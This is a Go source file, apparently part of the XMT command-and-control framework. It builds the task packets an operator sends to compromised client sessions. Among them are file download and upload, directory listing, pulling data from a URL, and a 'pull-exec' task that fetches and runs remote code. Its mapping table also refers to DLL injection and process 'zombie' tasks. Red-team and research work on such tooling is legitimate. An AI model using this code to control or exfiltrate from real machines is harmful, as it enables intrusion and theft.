// Package task is a simple collection of Task based functions that cane be
// tasked to Sessions by the Server.
//
// THis package is separate rom the c2 package to allow for seperation and
// containerization of Tasks.
//
// Basic internal Tasks are still help in the c2 package.
package task

import (
	"context"
	"io"
	"os"

	"github.com/iDigitalFlame/xmt/cmd/filter"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/data"
	"github.com/iDigitalFlame/xmt/device"
)

// The Mv* Packet ID values are built-in task values that are handled
// directory before the Mux, as these are critical for operations.
//
// Tv* ID values are standard ID values for Tasks that are handled here.
const (
	MvRefresh uint8 = 0x07
	MvTime    uint8 = 0x08
	MvPwd     uint8 = 0x09
	MvCwd     uint8 = 0x0A
	MvProxy   uint8 = 0x0B // TODO(dij): setup
	MvSpawn   uint8 = 0x0C
	MvMigrate uint8 = 0x0D
	MvElevate uint8 = 0x0E
	MvList    uint8 = 0x0F
	MvMounts  uint8 = 0x10
	MvRevSelf uint8 = 0x11
	MvProfile uint8 = 0x12

	// Built in Task Message ID Values
	TvDownload    uint8 = 0xC0
	TvUpload      uint8 = 0xC1
	TvExecute     uint8 = 0xC2
	TvAssembly    uint8 = 0xC3
	TvZombie      uint8 = 0xC4
	TvDLL         uint8 = 0xC5
	TvCheckDLL    uint8 = 0xC6
	TvReloadDLL   uint8 = 0xC7
	TvPull        uint8 = 0xC8
	TvPullExecute uint8 = 0xC9
)

// Mappings is an fixed size array that contains the Tasker mappings for each
// ID value.
//
// Values that are less than 22 are ignored. Adding a mapping to here will
// allow it to be executed via the client Scheduler.
var Mappings = [0xFF]Tasker{
	TvDownload:    taskDownload,
	TvUpload:      taskUpload,
	TvExecute:     taskProcess,
	TvAssembly:    taskAssembly,
	TvPull:        taskPull,
	TvPullExecute: taskPullExec,
	TvZombie:      taskZombie,
	TvDLL:         taskInject,
	TvCheckDLL:    taskCheck,
	TvReloadDLL:   taskReload,
}

// Tasklet is an interface that allows for Sessions to be directly tasked
// without creating the underlying Packet.
//
// The 'Packet' function should return a Packet that has the Task data or
// any errors that may have occurred during Packet generation.
//
// This function should be able to be called multiple times.
type Tasklet interface {
	Packet() (*com.Packet, error)
}

// Tasker is an function alias that will be tasked with executing a Job and
// will return an error or write the results to the supplied Writer.
// Associated data can be read from the supplied Reader.
//
// This function is NOT responsible with writing any error codes, the parent
// caller will handle that.
type Tasker func(context.Context, data.Reader, data.Writer) error

// Pwd returns a print current directory Packet. This can be used to instruct
// the client to return a string value that contains the current working
// directory.
//
// C2 Details:
//  ID: MvPwd
//
//  Input:
//      <none>
//  Output:
//      string // Working Dir
//
// C2 Client Command:
//  pwd
func Pwd() *com.Packet {
	return &com.Packet{ID: MvPwd}
}

// Mounts returns a list mounted drives Packet. This can be used to instruct
// the client to return a string list of all the mount points on the client
// device.
//
// C2 Details:
//  ID: MvMounts
//
//  Input:
//      <none>
//  Output:
//      []string // Mount Paths List
//
// C2 Client Command:
//  mounts
func Mounts() *com.Packet {
	return &com.Packet{ID: MvMounts}
}

// Refresh will instruct the client to read update it's internal Device storage
// and return the new result. This can be used to detect new network interfaces
// added/removed and changes to hostname/user status.
//
// This is NOT needed after a Migration, as this happens automatically.
//
// C2 Details:
//  ID: MvRefresh
//
//  Input:
//      <none>
//  Output:
//      Machine // Updated device details
//
// C2 Client Command:
//    refresh
func Refresh() *com.Packet {
	return &com.Packet{ID: MvRefresh}
}

// Ls returns a file list Packet. This can be used to instruct the client
// to return a string and bool list of the files in the directory specified.
//
// If 'd' is empty, the current working directory "." is used.
//
// The source path may contain environment variables that will be resolved
// during runtime.
//
// C2 Details:
//  ID: MvList
//
//  Input:
//      string          // Directory
//  Output:
//      uint32          // Count
//      []File struct {
//          string      // Name
//          int32       // Mode
//          uint64      // Size
//          int64       // Modtime
//      }
//
// C2 Client Command:
//  ls [path]
//  dir [path]
func Ls(d string) *com.Packet {
	n := &com.Packet{ID: MvList}
	n.WriteString(d)
	return n
}

// Cwd returns a change directory Packet. This can be used to instruct the
// client to change from it's current working directory to the directory
// specified.
//
// Empty or invalid directory entires will return an error.
//
// The source path may contain environment variables that will be resolved
// during runtime.
//
// C2 Details:
//  ID: MvCwd
//
//  Input:
//      string // Directory
//  Output:
//      <none>
//
// C2 Client Command:
//  cd <path>
func Cwd(d string) *com.Packet {
	n := &com.Packet{ID: MvCwd}
	n.WriteString(d)
	return n
}

// Download will instruct the client to read the (client local) filepath
// provided and return the raw binary data.
//
// The source path may contain environment variables that will be resolved
// during runtime.
//
// C2 Details:
//  ID: TvDownload
//
//  Input:
//      string // Target
//  Output:
//      string // Expanded Target Path
//      bool   // Target is Directory
//      int64  // Size
//      []byte // Data
//
// C2 Client Command:
//    download <src> [dest]
func Download(src string) *com.Packet {
	n := &com.Packet{ID: TvDownload}
	n.WriteString(src)
	return n
}

// Pull will instruct the client to download the resource from the provided
// URL and write the data to the supplied local filesystem path.
//
// The path may contain environment variables that will be resolved during
// runtime.
//
// C2 Details:
//  ID: TvPull
//
//  Input:
//      string // URL
//      string // Target Path
//  Output:
//      string // Expanded Destination Path
//      uint64 // Byte Count Written
//
// C2 Client Command:
//  pull <url> <dest>
func Pull(url, path string) *com.Packet {
	n := &com.Packet{ID: TvPull}
	n.WriteString(url)
	n.WriteString(path)
	return n
}

// Upload will instruct the client to write the provided byte array to the
// filepath provided. The client will return the number of bytes written and
// the resulting file path.
//
// The destination path may contain environment variables that will be resolved
// during runtime.
//
// C2 Details:
//  ID: TvUpload
//
//  Input:
//      string (dts)
//      []byte (file data)
//  Output:
//      string (expanded path)
//      uint64 (file size written)
//
// C2 Client Command:
//  upload <src> <dst>
func Upload(dst string, b []byte) *com.Packet {
	n := &com.Packet{ID: TvUpload}
	n.WriteString(dst)
	n.Write(b)
	return n
}

// UploadFile will instruct the client to write the provided (server local) file
// content to the filepath provided. The client will return the number of bytes
// written and the resulting file path.
//
// The destination path may contain environment variables that will be resolved
// during runtime.
//
// The source path may contain environment variables that will be resolved on
// server execution.
//
// C2 Details:
//  ID: TvUpload
//
//  Input:
//      string (dts)
//      []byte (file data)
//  Output:
//      string (expanded path)
//      uint64 (file size written)
//
// C2 Client Command:
//  upload <src> <dst>
func UploadFile(dst, src string) (*com.Packet, error) {
	f, err := os.OpenFile(device.Expand(src), os.O_RDONLY, 0)
	if err != nil {
		return nil, err
	}
	n, err := UploadReader(dst, f)
	f.Close()
	return n, err
}

// UploadReader will instruct the client to write the provided reader content
// to the filepath provided. The client will return the number of bytes written
// and the resulting file path.
//
// The destination path may contain environment variables that will be resolved
// during runtime.
//
// C2 Details:
//  ID: TvUpload
//
//  Input:
//      string (dts)
//      []byte (file data)
//  Output:
//      string (expanded path)
//      uint64 (file size written)
//
// C2 Client Command:
//  upload <src> <dst>
func UploadReader(dst string, r io.Reader) (*com.Packet, error) {
	n := &com.Packet{ID: TvUpload}
	n.WriteString(dst)
	_, err := io.Copy(n, r)
	return n, err
}

// PullExecute will instruct the client to download the resource from the
// provided URL and execute the downloaded data.
//
// The download data may be saved in a temporary location depending on what the
// resulting data type is or file extension.
//
// This function allows for specifying a Filter struct to specify the target
// parent process and the boolean flag can be set to true/false to specify
// if the task should wait for the process to exit.
//
// Returns the same output as the 'Run*' tasks.
//
// C2 Details:
//  ID: TvPullExecute
//
//  Input:
//      string          // URL
//      bool            // Wait
//      Filter struct { // Filter
//          bool        // Filter Status
//          uint32      // PID
//          bool        // Fallback
//          uint8       // Session
//          uint8       // Elevated
//          []string    // Exclude
//          []string    // Include
//      }
//  Output:
//      uint32          // PID
//      int32           // Exit Code
//
// C2 Client Command:
//  pull-exec <url> [wait]
func PullExecute(url string, w bool, f *filter.Filter) *com.Packet {
	n := &com.Packet{ID: TvPullExecute}
	n.WriteString(url)
	n.WriteBool(w)
	f.MarshalStream(n)
	return n
}
